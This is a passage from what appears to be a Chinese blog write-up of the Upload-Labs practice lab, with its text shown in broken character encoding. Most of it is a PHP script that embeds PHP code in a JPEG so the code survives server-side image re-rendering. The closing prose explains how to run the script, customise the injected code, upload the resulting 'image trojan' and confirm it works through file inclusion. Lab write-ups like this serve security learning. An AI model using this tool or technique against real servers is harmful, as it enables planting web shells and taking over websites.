</span></span><span class=line><span class=cl>                <span class=nv>$startPos</span> <span class=o>=</span> <span class=nv>$dis</span><span class=o>-&gt;</span><span class=na>seek</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                <span class=nv>$outStreamTmp</span> <span class=o>=</span> 
</span></span><span class=line><span class=cl>                    <span class=nx>substr</span><span class=p>(</span><span class=nv>$outStream</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nv>$startPos</span><span class=p>)</span> <span class=o>.</span> 
</span></span><span class=line><span class=cl>                    <span class=nv>$miniPayload</span> <span class=o>.</span> 
</span></span><span class=line><span class=cl>                    <span class=nx>str_repeat</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\0</span><span class=s2>&#34;</span><span class=p>,</span><span class=nv>$nullbytePayloadSize</span><span class=p>)</span> <span class=o>.</span> 
</span></span><span class=line><span class=cl>                    <span class=nx>substr</span><span class=p>(</span><span class=nv>$outStream</span><span class=p>,</span> <span class=nv>$startPos</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nx>checkImage</span><span class=p>(</span><span class=s1>&#39;_&#39;</span><span class=o>.</span><span class=nv>$argv</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=nv>$outStreamTmp</span><span class=p>,</span> <span class=k>TRUE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span><span class=p>(</span><span class=nv>$extraBytes</span> <span class=o>!==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=k>while</span><span class=p>((</span><span class=o>!</span><span class=nv>$dis</span><span class=o>-&gt;</span><span class=na>eof</span><span class=p>()))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=k>if</span><span class=p>(</span><span class=nv>$dis</span><span class=o>-&gt;</span><span class=na>readByte</span><span class=p>()</span> <span class=o>===</span> <span class=mh>0xFF</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                            <span class=k>if</span><span class=p>(</span><span class=nv>$dis</span><span class=o>-&gt;</span><span class=na>readByte</span> <span class=o>!==</span> <span class=mh>0x00</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                            <span class=p>}</span>
</span></span><span class=line><span class=cl>                        <span class=p>}</span>
</span></span><span class=line><span class=cl>                    <span class=p>}</span>
</span></span><span class=line><span class=cl>                    <span class=nv>$stopPos</span> <span class=o>=</span> <span class=nv>$dis</span><span class=o>-&gt;</span><span class=na>seek</span><span class=p>()</span> <span class=o>-</span> <span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                    <span class=nv>$imageStreamSize</span> <span class=o>=</span> <span class=nv>$stopPos</span> <span class=o>-</span> <span class=nv>$startPos</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                    <span class=nv>$outStream</span> <span class=o>=</span> 
</span></span><span class=line><span class=cl>                        <span class=nx>substr</span><span class=p>(</span><span class=nv>$outStream</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nv>$startPos</span><span class=p>)</span> <span class=o>.</span> 
</span></span><span class=line><span class=cl>                        <span class=nv>$miniPayload</span> <span class=o>.</span> 
</span></span><span class=line><span class=cl>                        <span class=nx>substr</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                            <span class=nx>str_repeat</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\0</span><span class=s2>&#34;</span><span class=p>,</span><span class=nv>$nullbytePayloadSize</span><span class=p>)</span><span class=o>.</span>
</span></span><span class=line><span class=cl>                                <span class=nx>substr</span><span class=p>(</span><span class=nv>$outStream</span><span class=p>,</span> <span class=nv>$startPos</span><span class=p>,</span> <span class=nv>$imageStreamSize</span><span class=p>),</span>
</span></span><span class=line><span class=cl>                            <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                            <span class=nv>$nullbytePayloadSize</span><span class=o>+</span><span class=nv>$imageStreamSize</span><span class=o>-</span><span class=nv>$extraBytes</span><span class=p>)</span> <span class=o>.</span> 
</span></span><span class=line><span class=cl>                                <span class=nx>substr</span><span class=p>(</span><span class=nv>$outStream</span><span class=p>,</span> <span class=nv>$stopPos</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span> <span class=k>elseif</span><span class=p>(</span><span class=nv>$correctImage</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=nv>$outStream</span> <span class=o>=</span> <span class=nv>$outStreamTmp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span><span class=p>(</span><span class=nx>checkImage</span><span class=p>(</span><span class=s1>&#39;payload_&#39;</span><span class=o>.</span><span class=nv>$argv</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=nv>$outStream</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;Success!&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nx>unlink</span><span class=p>(</span><span class=s1>&#39;payload_&#39;</span><span class=o>.</span><span class=nv>$argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;Something\&#39;s wrong&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>checkImage</span><span class=p>(</span><span class=nv>$filename</span><span class=p>,</span> <span class=nv>$data</span><span class=p>,</span> <span class=nv>$unlink</span> <span class=o>=</span> <span class=k>FALSE</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>global</span> <span class=nv>$correctImage</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nx>file_put_contents</span><span class=p>(</span><span class=nv>$filename</span><span class=p>,</span> <span class=nv>$data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$correctImage</span> <span class=o>=</span> <span class=k>TRUE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nx>imagecreatefromjpeg</span><span class=p>(</span><span class=nv>$filename</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$unlink</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nx>unlink</span><span class=p>(</span><span class=nv>$filename</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$correctImage</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>custom_error_handler</span><span class=p>(</span><span class=nv>$errno</span><span class=p>,</span> <span class=nv>$errstr</span><span class=p>,</span> <span class=nv>$errfile</span><span class=p>,</span> <span class=nv>$errline</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>global</span> <span class=nv>$extraBytes</span><span class=p>,</span> <span class=nv>$correctImage</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$correctImage</span> <span class=o>=</span> <span class=k>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/(\d+) extraneous bytes before marker/&#39;</span><span class=p>,</span> <span class=nv>$errstr</span><span class=p>,</span> <span class=nv>$m</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$m</span><span class=p>[</span><span class=mi>1</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nv>$extraBytes</span> <span class=o>=</span> <span class=p>(</span><span class=nx>int</span><span class=p>)</span><span class=nv>$m</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>class</span> <span class=nc>DataInputStream</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>private</span> <span class=nv>$binData</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>private</span> <span class=nv>$order</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>private</span> <span class=nv>$size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$filename</span><span class=p>,</span> <span class=nv>$order</span> <span class=o>=</span> <span class=k>false</span><span class=p>,</span> <span class=nv>$fromString</span> <span class=o>=</span> <span class=k>false</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>binData</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>order</span> <span class=o>=</span> <span class=nv>$order</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nv>$fromString</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>file_exists</span><span class=p>(</span><span class=nv>$filename</span><span class=p>)</span> <span class=o>||</span> <span class=o>!</span><span class=nx>is_file</span><span class=p>(</span><span class=nv>$filename</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;File not exists [&#39;</span><span class=o>.</span><span class=nv>$filename</span><span class=o>.</span><span class=s1>&#39;]&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>binData</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$filename</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>binData</span> <span class=o>=</span> <span class=nv>$filename</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>size</span> <span class=o>=</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>binData</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>public</span> <span class=k>function</span> <span class=nf>seek</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>size</span> <span class=o>-</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>binData</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>public</span> <span class=k>function</span> <span class=nf>skip</span><span class=p>(</span><span class=nv>$skip</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>binData</span> <span class=o>=</span> <span class=nx>substr</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>binData</span><span class=p>,</span> <span class=nv>$skip</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>public</span> <span class=k>function</span> <span class=nf>readByte</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>eof</span><span class=p>())</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>die</span><span class=p>(</span><span class=s1>&#39;End Of File&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=nv>$byte</span> <span class=o>=</span> <span class=nx>substr</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>binData</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>binData</span> <span class=o>=</span> <span class=nx>substr</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>binData</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=nx>ord</span><span class=p>(</span><span class=nv>$byte</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>public</span> <span class=k>function</span> <span class=nf>readShort</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>binData</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>2</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>die</span><span class=p>(</span><span class=s1>&#39;End Of File&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=nv>$short</span> <span class=o>=</span> <span class=nx>substr</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>binData</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>binData</span> <span class=o>=</span> <span class=nx>substr</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>binData</span><span class=p>,</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>order</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nv>$short</span> <span class=o>=</span> <span class=p>(</span><span class=nx>ord</span><span class=p>(</span><span class=nv>$short</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=nx>ord</span><span class=p>(</span><span class=nv>$short</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nv>$short</span> <span class=o>=</span> <span class=p>(</span><span class=nx>ord</span><span class=p>(</span><span class=nv>$short</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=nx>ord</span><span class=p>(</span><span class=nv>$short</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=nv>$short</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>public</span> <span class=k>function</span> <span class=nf>eof</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=o>!</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>binData</span><span class=o>||</span><span class=p>(</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>binData</span><span class=p>)</span> <span class=o>===</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><h4 id=å‡†å¤‡-1 class=headerLink><a href=#%e5%87%86%e5%a4%87-1 class=header-mark></a>å‡†å¤‡</h4><p>â€‹ å‡†å¤‡ä¸€ä¸ª<strong>yoo.jpg</strong>å›¾ç‰‡ï¼Œä¸Šä¼ ç»è¿‡æ¸²æŸ“ä»¥åå†ä¸‹è½½ä¸‹åˆ°æœ¬åœ°ï¼Œä¿å­˜ä¸º<strong>1.jpg</strong>ã€‚</p><h4 id=æ’å…¥ä»£ç  class=headerLink><a href=#%e6%8f%92%e5%85%a5%e4%bb%a3%e7%a0%81 class=header-mark></a>æ’å…¥ä»£ç </h4><p>â€‹ ä½¿ç”¨è„šæœ¬å¤„ç†<strong>1.jpg</strong>æ’å…¥phpä»£ç ï¼Œæ‰§è¡Œå‘½ä»¤<code>php jpg_payload.php 1.jpg</code>ã€‚phpå‘½ä»¤æ‰§è¡Œæ–¹æ³•ä¸Šé¢æœ‰ã€‚æ‰§è¡ŒæˆåŠŸä»¥ååº”è¯¥å¦‚å›¾æ‰€ç¤ºï¼š</p><p><a class=lightgallery href=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116212640.png title=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116212640.png data-thumbnail=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116212640.png><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116212640.png data-srcset="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116212640.png, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116212640.png 1.5x, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116212640.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116212640.png></a></p><p>â€‹ æ‰§è¡Œçš„ç›®å½•ä¸‹ä¼šå¤šå‡ºä¸€ä¸ªåä¸º<code>payload_1.jpg</code>çš„æ–‡ä»¶ï¼Œè¿™å°±æ˜¯åˆ¶ä½œå¥½çš„å›¾ç‰‡é©¬ã€‚å¤§ä½¬çš„æºç æˆ‘æ˜¯ä¿®æ”¹äº†ä¸€ä¸‹çš„ï¼Œå¯ä»¥ä¿®æ”¹ä¸Šé¢çš„ç¬¬25è¡Œä»£ç ï¼Œè‡ªå®šä¹‰æ’å…¥æƒ³è¦çš„ä»£ç ã€‚</p><h4 id=ä¸Šä¼ å¹¶éªŒè¯ class=headerLink><a href=#%e4%b8%8a%e4%bc%a0%e5%b9%b6%e9%aa%8c%e8%af%81 class=header-mark></a>ä¸Šä¼ å¹¶éªŒè¯</h4><p>â€‹ ä¸Šä¼ ä»¥ååŒæ ·å…ˆç¡®å®šå›¾ç‰‡çš„åç§°å’Œåœ°å€ï¼Œé€‚ç”¨æ–‡ä»¶åŒ…å«è¿›è¡ŒéªŒè¯</p><p><a class=lightgallery href=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116215008.png title=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116215008.png data-thumbnail=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116215008.png><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116215008.png data-srcset="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116215008.png, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116215008.png 1.5x, https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116215008.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116215008.png></a></p><p>â€‹ å¦‚æœå¦‚å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬çš„å›¾ç‰‡é©¬å°±ä¸Šä¼ æˆåŠŸäº†ã€‚<strong>éœ€è¦æé†’ï¼šæœ‰äº›å›¾ç‰‡ä¸è¡Œå¯èƒ½éœ€è¦å¤šæ¢å‡ ä¸ªå›¾ç‰‡è¯•ä¸€è¯•ï¼ï¼ï¼</strong></p><p>å‘¼ï¼Œç»ˆäºå¯ä»¥ä¼‘æ¯äº†ã€‚</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>æ›´æ–°äº 2020-11-16</span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/>æ–‡ä»¶ä¸Šä¼ æ¼æ´</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>è¿”å›</a></span>&nbsp;|&nbsp;<span><a href=/>ä¸»é¡µ</a></span></section></div><div class=post-nav><a href=/posts/upload-labs3/ class=prev rel=prev title=Upload-Labs(ä¸‰)><i class="fas fa-angle-left fa-fw"></i>Upload-Labs(ä¸‰)</a>
<a href=/posts/upload-labs5/ class=next rel=next title=Upload-Labsçš„æœ€åå‡ é“é¢˜>Upload-Labsçš„æœ€åå‡ é“é¢˜<i class="fas fa-angle-right fa-fw"></i></a></div></div><div id=comments><div id=twikoo></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://twikoo.js.org/>Twikoo</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>ç”± <a href=https://gohugo.io/ target=_blank rel="noopener noreferrer" title="Hugo 0.104.0">Hugo</a> å¼ºåŠ›é©±åŠ¨&nbsp;|&nbsp;ä¸»é¢˜ - <a href=https://github.com/HEIGE-PCloud/DoIt target=_blank rel="noopener noreferrer" title="DoIt 0.2.13"><i class="far fa-edit fa-fw"></i> DoIt</a></div><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2020 - 2022</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank rel="noopener noreferrer">Braindance</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div><div class=footer-line></div><div class=footer-line></div></div></footer></div><div id=fixed-buttons><a href=#back-to-top id=back-to-top-button class=fixed-button title=å›åˆ°é¡¶éƒ¨><i class="fas fa-arrow-up fa-fw"></i>
</a><a href=# id=view-comments class=fixed-button title=æŸ¥çœ‹è¯„è®º><i class="fas fa-comment fa-fw"></i></a></div><div class=assets><script type=text/javascript src=/lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=/lib/fuse/fuse.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/topbar/topbar.min.js></script><script type=text/javascript src=/lib/pjax/pjax.min.js></script><script type=text/javascript src=/js/theme.min.js defer></script><script type=text/javascript>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","UA-176925141-1",{anonymize_ip:!0})</script><script type=text/javascript src="https://www.googletagmanager.com/gtag/js?id=UA-176925141-1" async></script><script>var _hmt=_hmt||[];(function(){var e,t=document.createElement("script");t.src="https://hm.baidu.com/hm.js?3b1ab845351bb3a8ee808b639bca6ce5",e=document.getElementsByTagName("script")[0],e.parentNode.insertBefore(t,e)})()</script></div><div class=pjax-assets><script type=text/javascript>window.config={code:{copyTitle:"å¤åˆ¶åˆ°å‰ªè´´æ¿",maxShownLines:10},comment:{twikoo:{commentCount:!0,el:"#twikoo",envId:"https://twikoo.penginman.com/",lang:"zh-cn"}},lightGallery:{actualSize:!1,exThumbImage:"data-thumbnail",hideBarsDelay:2e3,selector:".lightgallery",speed:400,thumbContHeight:80,thumbWidth:80,thumbnail:!0},search:{distance:100,findAllMatches:!1,fuseIndexURL:"/index.json",highlightTag:"em",ignoreFieldNorm:!1,ignoreLocation:!1,isCaseSensitive:!1,location:0,maxResultLength:10,minMatchCharLength:2,noResultsFound:"æ²¡æœ‰æ‰¾åˆ°ç»“æœ",snippetLength:50,threshold:.3,type:"fuse",useExtendedSearch:!1},twemoji:!0}</script><script type=text/javascript src=/lib/twikoo/twikoo.all.min.js defer></script><script type=text/javascript src=/js/twikoo.min.js defer></script><script type=text/javascript src=/lib/twemoji/twemoji.min.js defer></script><script type=text/javascript src=/js/twemoji.min.js defer></script><script type=text/javascript src=/lib/lightgallery/lightgallery.min.js></script><script type=text/javascript src=/lib/lightgallery/lg-thumbnail.min.js></script><script type=text/javascript src=/lib/lightgallery/lg-zoom.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><link rel=stylesheet href=/lib/lightgallery/lightgallery.min.css></div></body></html>